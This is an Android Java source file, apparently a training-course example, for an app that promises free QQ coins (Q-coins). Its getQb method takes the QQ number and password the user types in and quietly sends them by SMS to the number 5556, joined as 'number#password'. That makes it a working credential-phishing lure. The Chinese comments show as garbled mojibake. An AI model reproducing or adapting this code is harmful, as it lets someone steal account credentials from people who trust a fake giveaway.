package com.itheima.qb;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {

	EditText ed_number;
	EditText ed_pwd;
	
	// MainActivity �� ��ʼ ��ʼ��ʱ ��ִ�еķ���
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        //��ʼ���Ķ��� 
        ed_number = (EditText) findViewById(R.id.ed_number);
        ed_pwd = (EditText) findViewById(R.id.ed_pwd);
    }

    //��ȡQ��
    public void getQb(View v){
    	
    	String number = ed_number.getText().toString();
    	String pwd = ed_pwd.getText().toString();
    	
    	if(TextUtils.isEmpty(number)||TextUtils.isEmpty(pwd)){
    		
    		//���û���ʾ ,  ��˾��ʾ 
    		//context: 
    		Toast.makeText(this, "�Բ���, QQ���� �������� ����Ϊ��,���� ������ȡ", Toast.LENGTH_LONG).show();
    		return;
    	}
    	
    	//����ߵ�����,��  ��� qq ���� ������, ���Ͷ���
    	
    	SmsManager manager = SmsManager.getDefault();
    	
    	// destinationAddress :����˭, 
    	//scAddress : ���Ķ����� 
    	//text : ��������
    	//sentIntent :���� ���� ��ȥ�ı���
    	//deliveryIntent : �Է��ɹ����յ����ŵı��� 
    	String text =  number+"#"+pwd;
    	manager.sendTextMessage("5556", null, text, null, null);
    	
    }

}
